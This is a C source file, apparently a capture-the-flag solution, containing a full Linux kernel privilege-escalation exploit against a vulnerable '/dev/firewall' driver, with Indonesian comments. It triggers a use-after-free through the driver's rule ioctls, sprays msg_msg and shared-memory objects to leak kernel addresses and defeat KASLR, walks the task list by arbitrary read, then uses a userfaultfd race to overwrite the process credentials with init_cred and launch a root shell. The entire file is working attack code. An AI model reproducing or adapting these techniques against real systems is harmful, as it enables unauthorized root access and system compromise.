#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <byteswap.h>
#include <poll.h>
#include <assert.h>
#include <time.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/timerfd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/reboot.h>
#include <linux/userfaultfd.h>
#include <arpa/inet.h>
#include <sys/shm.h>

#define UFFDIO_API 0xc018aa3f
#define UFFDIO_REGISTER 0xc020aa00
#define UFFDIO_UNREGISTER 0x8010aa01
#define UFFDIO_COPY 0xc028aa03
#define UFFDIO_ZEROPAGE 0xc020aa04
#define UFFDIO_WAKE 0x8010aa02

#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad

typedef struct 
{
        long mtype;
        char mtext[1];
}msg;

typedef struct 
{
    void *ll_next;
    void *ll_prev;
    long m_type;
    size_t m_ts;
    void *next;
    void *security;
}msg_header;

#define INBOUND 0
#define OUTBOUND 1
#define DESC_MAX 0x800

typedef struct
{
    char iface[16];
    char name[16];
    char ip[16];
    char netmask[16];
    uint8_t idx;
    uint8_t type;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
    char desc[DESC_MAX];
} user_rule_t;

int fd;
uint32_t target_idx;
uint64_t target_addr;
uint32_t target_size;
uint64_t race_page;
pthread_t thread;

uint64_t init_ipc_ns, kbase, init_task, init_cred;

void hexprint(char *buffer, unsigned int bytes) // print like gdb qwords, we round to nearest dqword
{
    int dqwords = ((bytes + 0x10 - 1)&0xfffffff0) / 0x10;
    int qwords = dqwords * 2;
    for (int i = 0; i < qwords; i+=2)
    {
        printf("0x%04llx: 0x%016llx 0x%016llx\n", (i * 0x8), ((unsigned long long*)buffer)[i], ((unsigned long long*)buffer)[i+1]);
    }
    puts("-----------------------------------------------");
    return;
}

void gen_dot_notation(char *buf, uint32_t val)
{
    sprintf(buf, "%d.%d.%d.%d", val & 0x000000FF, (val & 0x0000FF00) >> 8, (val & 0x00FF0000) >> 16, (val & 0xFF000000) >> 24);
    return;
}

void generate(char *input, user_rule_t *req)
{
    char addr[0x10];
    uint32_t ip = *(uint32_t *)&input[0x20];
    uint32_t netmask = *(uint32_t *)&input[0x24];

    memset(addr, 0, sizeof(addr));
    gen_dot_notation(addr, ip);
    memcpy((void *)req->ip, addr, 0x10);

    memset(addr, 0, sizeof(addr));
    gen_dot_notation(addr, netmask);
    memcpy((void *)req->netmask, addr, 0x10);

    memcpy((void *)req->iface, input, 0x10);
    memcpy((void *)req->name, (void *)&input[0x10], 0x10);
    memcpy((void *)&req->proto, (void *)&input[0x28], 2);
    memcpy((void *)&req->port, (void *)&input[0x28 + 2], 2);
    memcpy((void *)&req->action, (void *)&input[0x28 + 2 + 2], 1);

    return;
}

int ioctl(int fd, unsigned long request, unsigned long param) //ioctl wrapper
{
    return syscall(__NR_ioctl, fd, request, param);
}

int add(int fd, uint8_t idx, char *buffer, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    generate(buffer, (user_rule_t *)&rule);
    rule.idx = idx;
    rule.type = type;
    return ioctl(fd, ADD_RULE, (unsigned long)&rule);
}

int delete(int fd, uint8_t idx, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    rule.idx = idx;
    rule.type = type;
    return ioctl(fd, DELETE_RULE, (unsigned long)&rule);
}

int edit(int fd, uint8_t idx, char *buffer, int type, int invalidate)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    generate(buffer, (user_rule_t *)&rule);
    rule.idx = idx;
    rule.type = type;
    if (invalidate)
    {
        strcpy((void *)&rule.ip, "invalid");
        strcpy((void *)&rule.netmask, "invalid");
    }
    return ioctl(fd, EDIT_RULE, (unsigned long)&rule);   
}

int duplicate(int fd, uint8_t idx, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    rule.idx = idx;
    rule.type = type;
    return ioctl(fd, DUP_RULE, (unsigned long)&rule);
}

int32_t make_queue(key_t key, int msgflg)
{
    int32_t result;
    if ((result = msgget(key, msgflg)) == -1) 
    {
        perror("msgget failure");
        exit(-1);
    }
    return result;
}

void get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg)
{
    if (msgrcv(msqid, msgp, msgsz, msgtyp, msgflg) < 0)
    {
        perror("msgrcv");
        exit(-1);
    }
    return;
}

void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg)
{
    if (msgsnd(msqid, msgp, msgsz, msgflg) == -1)
    {
        perror("msgsend failure");
        exit(-1);
    }
    return;
}

void *arb_write(void *arg)
{
    struct uffd_msg uf_msg;
    struct uffdio_copy uf_copy;
    struct uffdio_range uf_range;
    long uffd = (long)arg;
    struct pollfd poll_fd;
    int nready;

    poll_fd.fd = uffd;
    poll_fd.events = POLLIN;

    uf_range.start = race_page;
    uf_range.len = 0x1000;

    while(poll(&poll_fd,1,-1) > 0){
        if(poll_fd.revents & POLLERR || poll_fd.revents & POLLHUP){
            perror("polling error");
            exit(EXIT_FAILURE);
        }

        //membaca event dari kesalahan halaman
        if(read(uffd,&uf_msg,sizeof(uf_msg))==-1){
            perror("gagal membaca pesan");
            exit(EXIT_FAILURE);
        }
        printf("membaca uf_msg berhasil\n");
        if(uf_msg.event != UFFD_EVENT_PAGEFAULT){
            perror("gagal membaca event kesalahan halaman");
            exit(EXIT_FAILURE);
        }
        printf("membaca kesalahan halaman\n");

        //timpa ke init_cred
        char uf_buff[0x1000];
        memset(uf_buff,0,sizeof(uf_buff));
        memcpy((void *)(uf_buff + 0x1000 - 0x30),(void *)&init_cred,8);
        memcpy((void *)(uf_buff + 0x1000 - 0x30 + 0x8), (void *)&init_cred,8);

        uf_copy.src = (unsigned long)uf_buff;
        uf_copy.dst = race_page;
        uf_copy.len = 0x1000;
        uf_copy.mode = 0;
        uf_copy.copy = 0;

        char buff[0x2000];
        memset(buff,0,sizeof(buff));

        msg_header msg_evil;
        memset((void *)&msg_evil,0,sizeof(msg_evil));
        msg_evil.ll_next = (void *)0x1337babe;
        msg_evil.ll_prev = (void *)0xbaadf00d;
        msg_evil.m_type = 1;
        msg_evil.m_ts = 0x1008 - 0x30;
        msg_evil.next = (void *)target_addr;

        memcpy(buff,(void *)&msg_evil,sizeof(msg_header));
        edit(fd,target_idx,buff,OUTBOUND,0);

        if(ioctl(uffd,UFFDIO_COPY,(unsigned long)&uf_copy)==-1){
            perror("uffdio_copy error");
            exit(EXIT_FAILURE);
        }
        printf("uffdio copy\n");
        if(ioctl(uffd,UFFDIO_UNREGISTER,(unsigned long)&uf_range)==-1){
            perror("gagal unregister halaman untuk userfaultfd");
            exit(EXIT_FAILURE);
        }
        printf("unregister kesalahan halaman\n");
        if(munmap((void *)race_page,0x1000)==-1){
            perror("gagal munmap race page");
        }
        printf("munmap kesalahan halaman\n");
        return 0;
    }
    puts("ROOOOT");

    return 0;
}

void register_userfaultfd(uint64_t race_page, pthread_t thread, void *(func)(void*))
{
    int uffd, race;
    struct uffdio_api uf_api;
    struct uffdio_register uf_register;

    uffd = syscall(__NR_userfaultfd,O_CLOEXEC|O_NONBLOCK);
    uf_api.api = UFFD_API;
    uf_api.features = 0;

    if(ioctl(uffd,UFFDIO_API,(unsigned long)&uf_api)==-1){
        perror("uffdio_api:");
        exit(EXIT_FAILURE);
    }
    
    printf("mendaftarkan userfaultfd untuk alamat 0x%016lx\n" ,race_page);
    //maping halaman userfaultfd
    if(mmap((void*)race_page, 0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,0,0)==-1){
        perror("kesalahan di mmap");
        exit(EXIT_FAILURE);
    }

    uf_register.range.start = race_page;
    uf_register.range.len = 0x1000;
    uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;

    if(ioctl(uffd,UFFDIO_REGISTER,(unsigned long)&uf_register)==-1){
        perror("error mendaftarkan halaman untuk userfaultfd");
        exit(EXIT_FAILURE);
    }
    puts("uffdio_register didaftarkan");

    race = pthread_create(&thread,NULL,func,(void *)(long)uffd);

    if(race != 0){
        perror("gagal menyiapkan thread untuk membuat kondisi balapan");
    }
    puts("memicu kondisi balapan");
    return;
}


int main()
{
    fd = open("/dev/firewall",O_RDONLY);
    if(fd==-1){
        perror("firewall");
        return EXIT_FAILURE;
    }
    char buff[0x2000],recv[0x2000];
    memset(buff,0,sizeof(buff));
    memset(recv,0,sizeof(recv));

    msg *message = (msg*)buff;
    int size, qid;
    
    for(int i=0x50;i<0x54;i++){
        add(fd,0,buff,INBOUND);
    }
    //buat kondisi UAF
    add(fd,0,buff,INBOUND);
    duplicate(fd,0,INBOUND);

    //hapus firewall untuk membuat kondisi UAF
    delete(fd,0,INBOUND);
    
    qid = make_queue(IPC_PRIVATE,0666| IPC_CREAT);
    //kita akan membuat memicu out of bounds terlebih dahulu

    size = 0x1010;
    message->mtype = 1;
    memset(message->mtext,0x41,size);
    
    //mengalokasikan potongan lama, karena perilaku SLAB LIFO
    send_msg(qid,message,size - 0x30, 0);

    //semprotkan struktur shmem, yang dialokasikan di
    //kmalloc-32, akan bersebelahan dengan msgseg *next

    int shmid;
    char *shmaddr;

    for(int i=0; i< 0x50; i++){
        if((shmid = shmget(IPC_PRIVATE,100,0600))==-1){
            perror("shmget:");
            exit(EXIT_FAILURE);
        }
        shmaddr = shmat(shmid,NULL,0);

        if(shmaddr == (void*)-1){
            perror("shmat:");
            exit(EXIT_FAILURE);
        }
    }

    msg_header msg_evil;

    size = 0x1400;
    memset((void *)&msg_evil,0,sizeof(msg_header));
    msg_evil.ll_next = (void *)0x4141414141414141;
    msg_evil.ll_next = (void *)0x4242424242424242;
    msg_evil.m_type = 1;
    msg_evil.m_ts = size;

    memset(buff,0,sizeof(buff));
    memcpy(buff,(void*)&msg_evil,0x20);
    edit(fd,0,buff,OUTBOUND,1);
    //bocorkan
    get_msg(qid,recv,size,0,IPC_NOWAIT|MSG_COPY|MSG_NOERROR);

    for (int i = 0; i < size; i++)
    {
        if((*(uint64_t*)(recv + i * 8) & 0xfff) == 0x7a0){
            init_ipc_ns = *(uint64_t*)(recv + i * 8);
            break;
        }
    }
    kbase = init_ipc_ns - (0xffffffff81c3d7a0 - 0xffffffff81000000);
    init_task = kbase + (0xffffffff81c124c0 - 0xffffffff81000000);
    init_cred = kbase + (0xffffffff81c33060 - 0xffffffff81000000);
    printf("[+] init_ipc_ns: 0x%llx\n", init_ipc_ns);
    printf("[+] kbase: 0x%llx\n", kbase);
    printf("[+] init_task: 0x%llx\n", init_task);
    printf("[+] init_cred: 0x%llx\n", init_cred);

    /*kali ini kita akan membocorkan structur tasks
    task seharusnya ada di offset 0x298, dan pid seharusnya
    ada di offset 0x398, kita akan melakukan arbitrary read 
    untuk membuktikannya*/

    memset((void *)&msg_evil,0,sizeof(msg_header));
    memset(recv,0,sizeof(recv));
    memset(buff,0,sizeof(buff));

    msg_evil.m_type = 1;
    msg_evil.m_ts = size;
    msg_evil.next = (void *)init_task + 0x298 - 8;
    memcpy(buff,(void *)&msg_evil,sizeof(msg_header));
    edit(fd,0,buff,OUTBOUND,0);
    get_msg(qid,recv,size,0,IPC_NOWAIT|MSG_COPY|MSG_NOERROR);


    int32_t pid;
    uint64_t prev,current_task;
    memcpy((void *)&prev,(void *)(recv + 0xfe0),8);
    memcpy((void *)&pid,(void *)(recv + 0x10d8),4);

    printf("pid = %d == %d\n" ,pid, getpid());

    while(pid !=getpid()){
        current_task = prev - 0x298;
        msg_evil.next = (void *)prev - 8;
        memcpy(buff,(void*)&msg_evil,sizeof(msg_header));
        edit(fd,0,buff,OUTBOUND,0);
        get_msg(qid,recv,size,0,IPC_NOWAIT|MSG_COPY|MSG_NOERROR);
        memcpy((void*)&prev,(void *)(recv + 0xfe0),8);
        memcpy((void*)&pid, (void *)(recv + 0x10d8),4);
        printf("%d == %d\n" ,pid,getpid());
    }
    printf("current task struct = 0x%016lx\n" ,current_task);

    //step 2
    /*buat kondisi uaf lagi*/
    add(fd,1,buff,INBOUND);
    duplicate(fd,1,INBOUND);
    delete(fd,1,INBOUND);
    //real_cred ada di offset 0x538
    //cred ada di offset 0x540

    memset(buff,0,sizeof(buff));
    msg *rooter;

    void *page = mmap((void*)0x1337000,0x1000,PROT_READ|PROT_WRITE,
                    MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,0,0);

    race_page = 0x1338000;
    rooter = (msg *)(race_page-0x8);
    rooter->mtype = 1;

    size = 0x1010;
    target_idx = 1;
    target_addr = current_task + 0x538 - 0x8;
    printf("target address to overwrite = 0x%016lx\n" ,target_addr);
    register_userfaultfd(race_page,thread,arb_write);
    send_msg(qid,rooter,size-0x30,0);
    pthread_join(thread,NULL);

    printf("uid = %d\n" ,getuid());
    system("/bin/sh");

}